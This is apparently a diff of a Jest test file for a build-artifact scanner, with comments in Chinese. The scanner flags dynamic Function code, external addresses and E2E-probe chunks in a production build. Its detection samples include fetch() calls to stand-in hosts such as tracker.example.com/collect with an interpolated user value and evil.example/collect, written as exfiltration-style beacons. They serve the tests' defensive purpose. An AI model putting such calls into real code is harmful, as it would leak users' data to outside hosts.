@@ -117,8 +117,8 @@ describe('US-M1-11 A01 产物扫描：动态代码', () => {
     expect(rules('const F=Function;try{new F("")}catch{}')).toContain('artifacts/dynamic-code')
   })
 
-  // 生产产物里 zod 的 Doc.compile 原文（压缩后）；样例是产物原文，不是要插值
-  // eslint-disable-next-line no-template-curly-in-string
+  // 生产产物里 zod 的 Doc.compile 原文（压缩后）
+  // eslint-disable-next-line no-template-curly-in-string -- 样例是产物原文，不是要插值
   const zodCompiler = 'var pl=class{compile(){let e=Function,t=this?.content??[``];return new e(...Object.keys(this.closed),`return function (${this.args.join(`, `)}) {\\n${t.join(`\n`)}\\n};`)(...Object.values(this.closed))}};'
 
   it('已登记的 zod JIT 编译器：原文以内不算动态代码，并计数；出现两次即违规；别处把 Function 赋给变量仍然违规', () => {
@@ -158,8 +158,7 @@ describe('US-M1-11 A01 产物扫描：外部地址与关键字', () => {
     expect([...result.hosts.keys()]).toEqual(['exa%mple.com'])
   })
 
-  // 以下样例都是产物里的模板字符串原文，不是要插值
-  /* eslint-disable no-template-curly-in-string */
+  /* eslint-disable no-template-curly-in-string -- 以下样例都是产物里的模板字符串原文，不是要插值 */
   it.each([
     ['查询里的插值', 'fetch(`https://tracker.example.com/collect?u=${user}`)', 'tracker.example.com'],
     ['路径里的插值', 'img.src=`https://evil.example/${id}.gif`', 'evil.example'],
@@ -205,7 +204,7 @@ describe('US-M1-11 A01 产物扫描：外部地址与关键字', () => {
     expect(rules(code)).toEqual(['artifacts/address'])
   })
 
-  /* eslint-disable no-template-curly-in-string */
+  /* eslint-disable no-template-curly-in-string -- 以下样例是产物里的模板字符串原文，不是要插值 */
   it.each([
     ['协议由插值给出', 'fetch(`${location.protocol}//evil.example/collect`)', 'evil.example'],
     ['拼接出的地址（转义的斜杠）', 'fetch("https:"+"\\/\\/evil.example/c")', 'evil.example'],
@@ -277,8 +276,8 @@ describe('US-M1-11 A01 产物扫描：外部地址与关键字', () => {
     expect(rules(content, path)).toEqual(['artifacts/address'])
   })
 
-  // 压缩器把普通字符串也写成模板字符串（复验 RA2）；以下样例是产物里的模板字符串原文，不是要插值
-  /* eslint-disable no-template-curly-in-string */
+  // 压缩器把普通字符串也写成模板字符串（复验 RA2）
+  /* eslint-disable no-template-curly-in-string -- 以下样例是产物里的模板字符串原文，不是要插值 */
   it.each([
     ['前导空格', 'fetch(` //evil.example/x`)'],
     ['前导空格与插值', 'fetch(` //evil.example/${a}`)'],
@@ -506,7 +505,7 @@ describe('US-M1-11 A01 产物扫描：外部地址与关键字', () => {
     once(build(1000))
     // 大小两种数量交替测，各取五次里最快的一次：两者经历同样的负载，比值不受机器忙闲的影响（原来先后分开测、
     // 数量乘 4、上限 10，整套单元测试并行跑时线性的扫描也偶发超过 10，第二轮复验）
-    const [small, large] = [build(4_000), build(64_000)]
+    const [small, large] = [build(2_000), build(32_000)]
     const times = { small: [] as number[], large: [] as number[] }
     for (let round = 0; round < 5; round++) {
       times.small.push(once(small))
@@ -516,7 +515,9 @@ describe('US-M1-11 A01 产物扫描：外部地址与关键字', () => {
     // 原来乘 8、上限 24，只有约 2.8 倍的余量：整套测试开着覆盖率并行跑时，线性的扫描实测到 26 倍（单独跑 7.7–8.5 倍，
     // 负载放大约 3.1 倍），M2-P1 收尾时偶发失败。乘 16 也让"平方项刚开始起作用"的情形更容易被发现
     expect(Math.min(...times.large) / Math.max(Math.min(...times.small), 1)).toBeLessThan(64)
-    // 计时的用例：CI 的机器慢、又开着覆盖率，给足时间
+    // 计时的用例，时限只用来发现卡住。M2-P1 把规模从 32k 翻到 64k 时没有动时限：四条之中最慢的 SVG 样式与全部单元测试一起跑 4.3 秒、
+    // 覆盖率那一轮 9.4 秒。M2-P6 第 6 片复核 G3 把规模减半回 2k/32k（倍数与上限不变），实测四条最慢的：本机单独 0.8 秒、
+    // 与全部单元测试一起跑 1.3 秒、覆盖率那一轮 2.7 秒。CI 的 tests 一步约是本机的 3.2 倍（估计 9 秒左右），60 秒有六倍余量
   }, 60_000)
 
   it('真实的允许清单：每一项都是合法的绝对地址，写明来源与用途，没有重复；前缀至少写到路径的第一段', () => {
@@ -558,5 +559,10 @@ describe('US-M1-09 生产构建里没有测试构建的文件', () => {
     const violations = checkTestOnlyArtifacts(['editor.html', 'assets/editor-BcxC.js', 'assets/e2e-probe-CC7cG7BE.js', 'assets/my-e2e-probe-x.js', 'assets/e2e-probes.js'])
     expect(violations.map(v => v.subject)).toEqual(['assets/e2e-probe-CC7cG7BE.js'])
     expect(violations[0]?.detail).toContain('E2E 探针')
+  })
+
+  it('探针补上的插件 Facade 单独成块出现在生产构建里同样违规（M2-P6 第 4 片复核 F5）：它没有探针的名字，只能按分块名认', () => {
+    const violations = checkTestOnlyArtifacts(['editor.html', 'assets/probe-facades-Dk3x.js', 'assets/facades-Dk3x.js', 'assets/my-probe-facades-x.js'])
+    expect(violations.map(v => v.subject)).toEqual(['assets/probe-facades-Dk3x.js'])
   })
 })
